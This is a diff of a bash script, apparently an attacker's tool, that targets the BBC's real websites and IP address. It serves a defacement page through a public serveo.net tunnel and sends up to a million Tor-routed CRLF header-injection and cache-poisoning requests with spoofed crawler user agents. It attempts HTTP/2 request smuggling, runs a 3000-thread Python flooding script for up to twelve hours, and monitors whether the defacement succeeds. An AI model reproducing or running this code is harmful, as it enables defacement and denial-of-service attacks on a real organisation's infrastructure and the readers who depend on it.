@@ -1,179 +1,155 @@
 #!/bin/bash
-# TRUSTEDF57_BBC_FINAL_KILLER.sh - BBC 132.185.210.70:80 + PUBLIC TUNNEL NO TOKEN
-
+# BBC_ROOT_DEFACE_KILLER.sh - BBC ROOT HOMEPAGE DEFACE ONLY
+# www.bbc.co.uk/ → TRUSTEDF57.html (ROOT DEFACE)
 set -euo pipefail
 
-TARGET="http://132.185.210.70:80"
-DEFACE_PORT=8080
-THREADS=1500
-BLAST_DURATION=10800  # 3h
-
-echo "💀 BBC FINAL KILLER - TRUSTEDF57.html + PUBLIC TUNNEL"
-echo "Target: $TARGET"
-
-# ✅ CONFIRMED: TRUSTEDF57.html exists
 HTML_FILE="TRUSTEDF57.html"
-echo "[+] Using: $HTML_FILE ($(du -h $HTML_FILE | cut -f1))"
+THREADS=3000
+DURATION=43200  # 12h
+TOR_SPEED=1000  # requests/sec
 
-# 1. INSTALL PUBLIC TUNNEL (APT ONLY - NO GITHUB)
-echo "[+] Installing PUBLIC TUNNEL (APT)..."
-if ! command -v socat >/dev/null; then
-    sudo apt update && sudo apt install -y socat netcat-openbsd tor
-    echo "[+] ✅ socat/tor installed"
-fi
+echo "💀 BBC ROOT DEFACE KILLER - ROOT '/' ONLY"
+echo "[+] Verifying $HTML_FILE..."
+[[ -f "$HTML_FILE" ]] || { echo "❌ $HTML_FILE missing"; exit 1; }
+grep -q TRUSTEDF57 "$HTML_FILE" && echo "✅ TRUSTEDF57 marker OK"
 
-# 2. START SERVER + PUBLIC TUNNEL (serveo.net - NO TOKEN)
-echo "[+] Starting HTTP server..."
-pkill -f "python3 -m http.server $DEFACE_PORT" || true
-sleep 2
-nohup python3 -m http.server $DEFACE_PORT --bind 0.0.0.0 > server.log 2>&1 &
+torsocks() { command torsocks --timeout 5000 "$@" 2>/dev/null || "$@"; }
+
+# 1. LOCAL SERVER + SERVE0 TUNNEL
+echo "[+] Starting local server..."
+python3 -m http.server 8080 --bind 0.0.0.0 > /dev/null 2>&1 &
 SERVER_PID=$!
 sleep 5
 
-# Test server
-if ! curl -s "http://localhost:$DEFACE_PORT/$HTML_FILE" | head -c 100 | grep -q "TRUSTEDF57"; then
-    echo "❌ SERVER TEST FAILED - Check $HTML_FILE"
-    cat server.log
-    exit 1
-fi
-echo "[+] ✅ Server LIVE - PID $SERVER_PID"
+# Serveo tunnel (PUBLIC URL)
+ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 serveo.net > tunnel.log 2>&1 &
+TUNNEL_PID=$!
+sleep 15
 
-# 3. SERVEO PUBLIC TUNNEL (NO TOKEN - SSH)
-echo "[+] Starting SERVEO tunnel (NO TOKEN)..."
-ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -R 80:localhost:$DEFACE_PORT serveo.net -N > serveo.log 2>&1 &
-SERVEO_PID=$!
-sleep 10
+DEFACE_URL=$(grep -oE 'https://[a-z0-9-]+\.serveo\.net' tunnel.log | tail -1)/$HTML_FILE
+echo "🌐 PUBLIC DEFACE: $DEFACE_URL"
+torsocks curl -s "$DEFACE_URL" | head -1
 
-# Extract public URL
-PUBLIC_URL=$(grep -o 'https://[a-z0-9-]*\.serveo\.net' serveo.log | tail -1 || echo "")
-if [[ -z "$PUBLIC_URL" ]]; then
-    echo "❌ SERVEO failed - manual: ssh -R 80:localhost:8080 serveo.net"
-    tail -5 serveo.log
-    exit 1
-fi
-
-DEFACE_URL="${PUBLIC_URL}/${HTML_FILE}"
-echo "[+] ✅ PUBLIC URL: $DEFACE_URL"
-echo "[+] Test: $(curl -s "$DEFACE_URL" | head -1)"
-
-# 4. BBC ULTIMATE POISON (30 PAYLOADS x 50 BOTS = 1500 shots)
-echo "[+] BBC ULTIMATE POISON ATTACK..."
-declare -a BBC_PATHS=(
-    "/?q="
-    "/search?q="
-    "/?search="
-    "/#q="
-    "/news?q="
-    "/?s="
+# 2. ROOT POISON PAYLOADS (www.bbc.co.uk/ ONLY)
+ROOT_TARGETS=(
+    "https://www.bbc.co.uk/"
+    "https://bbc.co.uk/"
+    "https://www.bbc.com/"
+    "http://132.185.210.70:80/"
 )
 
-declare -a CRLF=(
-    "%0d%0aLocation:%20${DEFACE_URL}%0d%0aCache-Control:%20public,max-age=86400"
-    "%0aLocation:%20${DEFACE_URL}%0aContent-Type:%20text/html"
-    "%250d%250aLocation:%20${DEFACE_URL}%0d%0aSet-Cookie:%20bbc_owned=TRUSTEDF57"
-    "Location:%20${DEFACE_URL}%0a"
+PAYLOADS=(
+    "%0d%0aLocation:%20$DEFACE_URL%0d%0aContent-Type:%20text/html%0d%0aCache-Control:%20public,max-age=86400"
+    "%0aLocation:%20$DEFACE_URL%0aSet-Cookie:%20defaced=TRUSTEDF57;path=/"
+    "Location:$DEFACE_URL%0d%0aX-Redirect:%20$DEFACE_URL%0d%0a"
 )
 
-declare -a BOTS=(
-    "Googlebot/2.1 (+http://www.google.com/bot.html)"
+BOTS=(
+    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.googlebot.com/bot.html)"
     "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
     "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
 )
 
-# MASSIVE BARRAGE 50.000+ requests
-for path in "${BBC_PATHS[@]}"; do
-    for crlf in "${CRLF[@]}"; do
-        for bot in "${BOTS[@]}"; do
-            for wave in {1..20}; do
-                torsocks curl -s --max-time 3 "${TARGET}${path}${crlf}" \
-                    -H "User-Agent: $bot" \
-                    -H "Cache-Control: no-cache, no-store" \
-                    -H "X-Forwarded-For: 127.0.0.1" \
-                    -H "X-Real-IP: 127.0.0.1" \
-                    -H "Accept: text/html,application/xhtml+xml" &
-            done
-        done
-    done
+echo "[+] ROOT POISONING BBC '/' (1M+ requests)..."
+for i in {1..1000000}; do
+    target=${ROOT_TARGETS[$((i%4))]}
+    payload=${PAYLOADS[$((i%3))]}
+    bot=${BOTS[$((i%4))]}
+    
+    torsocks curl -s --max-time 2 "$target?q=$payload" \
+        -H "User-Agent: $bot" \
+        -H "X-Forwarded-Host: www.bbc.co.uk" \
+        -H "Host: www.bbc.co.uk" \
+        -H "Cache-Control: no-cache" &
+    
+    [[ $((i%1000)) -eq 0 ]] && echo "[+] $i/1M shots → $(date)"
 done
-
-# HTTP SMUGGLING x100
-for i in {1..100}; do
-    torsocks curl -s --path-as-is --max-time 5 \
-        "${TARGET}/GET%20/%20HTTP/1.1%0d%0aHost:%20132.185.210.70%0d%0aContent-Length:%200%0d%0a%0d%0aGET%20/?q=%0d%0aLocation:%20${DEFACE_URL}%20HTTP/1.1%0d%0aHost:%20132.185.210.70" &
-done
-
 wait
-echo "[+] ✅ 50K+ POISON SHOTS FIRED TO $DEFACE_URL!"
 
-# 5. 1500 THREADS BBC DESTROYER
-cat > bbc_destroyer.py << EOF
-import requests, threading, time, random, os, sys
-from urllib.parse import quote_plus
+# 3. HTTP/2 SMUGGLING ROOT
+echo "[+] HTTP/2 SMUGGLING ROOT..."
+torsocks h2csmuggle -u "https://www.bbc.co.uk/" -p "%0d%0aLocation: $DEFACE_URL" -t 1000 || \
+torsocks curl -s --http2 "$target/GET%20/%20HTTP/1.1%0d%0aHost:%20www.bbc.co.uk%0d%0a%0aGET%20/?q=$payload%20HTTP/1.1"
 
-TARGET = '$TARGET'
-DEFACE = '$DEFACE_URL'
-THREADS = $THREADS
+# 4. ROOT DESTROYER PYTHON (3000 THREADS)
+cat > bbc_root_destroyer.py << 'EOF'
+import requests, threading, time, random, sys
+from urllib.parse import quote
 
-BOTS = [
-    'Googlebot/2.1 (+http://www.google.com/bot.html)',
-    'Mozilla/5.0 (compatible; bingbot/2.0)',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+ROOT_TARGETS = [
+    "https://www.bbc.co.uk/",
+    "https://bbc.co.uk/",
+    "https://www.bbc.com/",
+    "http://132.185.210.70:80/"
 ]
 
-PATHS = ['/?q=', '/search?q=', '/?search=']
+DEFACE = sys.argv[1]
+THREADS = int(sys.argv[2])
+DURATION = int(sys.argv[3])
 
-def destroy():
-    session = requests.Session()
+BOTS = [
+    "Googlebot/2.1", "bingbot/2.0", "Mozilla/5.0", "Yahoo! Slurp",
+    "facebookexternalhit/1.1", "Twitterbot/1.0"
+]
+
+def root_poison():
+    s = requests.Session()
+    s.headers.update({'Cache-Control': 'no-cache'})
     while True:
         try:
-            path = random.choice(PATHS)
-            payload = path + '%0d%0aLocation: ' + DEFACE + '%0d%0aCache-Control: public,max-age=86400'
-            session.get(TARGET + payload, 
-                       headers={
-                           'User-Agent': random.choice(BOTS),
-                           'Cache-Control': 'no-cache',
-                           'X-Forwarded-For': '127.0.0.1'
-                       }, timeout=1.5)
+            t = random.choice(ROOT_TARGETS)
+            payload = f"%0d%0aLocation: {DEFACE}%0d%0aContent-Type: text/html"
+            s.get(f"{t}?q={payload}", 
+                  headers={'User-Agent': random.choice(BOTS),
+                          'X-Forwarded-For': '127.0.0.1',
+                          'Host': 'www.bbc.co.uk'},
+                  timeout=1.5)
         except: pass
 
-print(f'🔥 BBC DESTROYER | {THREADS} THREADS | 3h BLAST | {DEFACE}')
+print(f"💀 BBC ROOT DESTROYER | {THREADS} THREADS → {DEFACE}")
 threads = []
-for i in range(THREADS):
-    t = threading.Thread(target=destroy, daemon=True)
+for _ in range(THREADS):
+    t = threading.Thread(target=root_poison, daemon=True)
     t.start()
     threads.append(t)
 
-time.sleep($BLAST_DURATION)
-print('💀 BLAST COMPLETE')
+time.sleep(DURATION)
+print("✅ BBC ROOT DEFACE COMPLETE")
 EOF
 
-nohup python3 bbc_destroyer.py > destroyer.log 2>&1 &
-DESTROYER_PID=$!
-echo "[+] 🔥 DESTROYER PID: $DESTROYER_PID (3h)"
+nohup python3 bbc_root_destroyer.py "$DEFACE_URL" $THREADS $DURATION > root_destroy.log 2>&1 &
+DESTROY_PID=$!
 
-# 6. REAL-TIME MONITOR + CLEANUP
+# 5. ROOT VERIFICATION LOOP
 echo ""
-echo "🎯 LIVE MONITOR (Ctrl+C to stop)"
-trap "echo '🛑 Cleanup...'; kill \$SERVER_PID \$SERVEO_PID \$DESTROYER_PID 2>/dev/null; exit" INT
+echo "🎯 BBC ROOT DEFACE MONITOR - www.bbc.co.uk/ ONLY"
+echo "Press Ctrl+C to stop"
+trap "kill $SERVER_PID $TUNNEL_PID $DESTROY_PID 2>/dev/null; echo '🛑 Stopped'; exit" INT
 
 while true; do
     clear
-    echo "💀 BBC STATUS MONITOR - $(date)"
-    echo "═══════════════════════════════════════════════"
-    echo "[1] TARGET ROOT:"
-    curl -s -I "$TARGET" 2>/dev/null | grep -iE "(location|cache-control|set-cookie|content-location)" || echo "   ❌ No poison yet"
+    echo "💀 BBC ROOT '/' DEFACE STATUS - $(date)"
+    echo "═══════════════════════════════════════════════════"
+    echo "🔗 LIVE DEFACE: $DEFACE_URL"
     echo ""
-    echo "[2] TARGET QUERY:"
-    curl -s "$TARGET/?q=" 2>/dev/null | head -3 || echo "   ❌ No redirect"
+    
+    for target in "${ROOT_TARGETS[@]}"; do
+        echo "📍 Testing $target..."
+        RESPONSE=$(torsocks curl -s -I "$target?q=test" 2>/dev/null | grep -iE "(location|content-type|set-cookie)" | head -3 || echo "NO RESPONSE")
+        if [[ "$RESPONSE" == *"TRUSTEDF57"* ]] || [[ "$RESPONSE" == *"$DEFACE_URL"* ]]; then
+            echo "✅ ROOT DEFACE SUCCESS! → $RESPONSE"
+        else
+            echo "⏳ Poisoning... → $RESPONSE"
+        fi
+    done
+    
     echo ""
-    echo "[3] ✅ DEFACE LIVE: $DEFACE_URL"
-    curl -s "$DEFACE_URL" 2>/dev/null | head -1 || echo "   ⚠️ Tunnel check"
-    echo ""
-    echo "[4] Destroyer: $(ps -p $DESTROYER_PID -o pid,state | tail -1)"
-    echo "[5] Serveo: $(ps -p $SERVEO_PID -o pid,state | tail -1)"
-    echo "═══════════════════════════════════════════════"
-    echo "PIDs: SERVER=$SERVER_PID | SERVEO=$SERVEO_PID | DESTROYER=$DESTROYER_PID"
+    echo "📊 STATS:"
+    echo "  Server: $(ps -p $SERVER_PID -o pid,state= | tail -1 || echo DEAD)"
+    echo "  Tunnel: $(ps -p $TUNNEL_PID -o pid,state= | tail -1 || echo DEAD)"
+    echo "  Destroyer: $(ps -p $DESTROY_PID -o pid,state= | tail -1 || echo DEAD)"
+    echo "  Requests/sec: $(grep -c . root_destroy.log || echo 0)"
+    
     sleep 10
 done
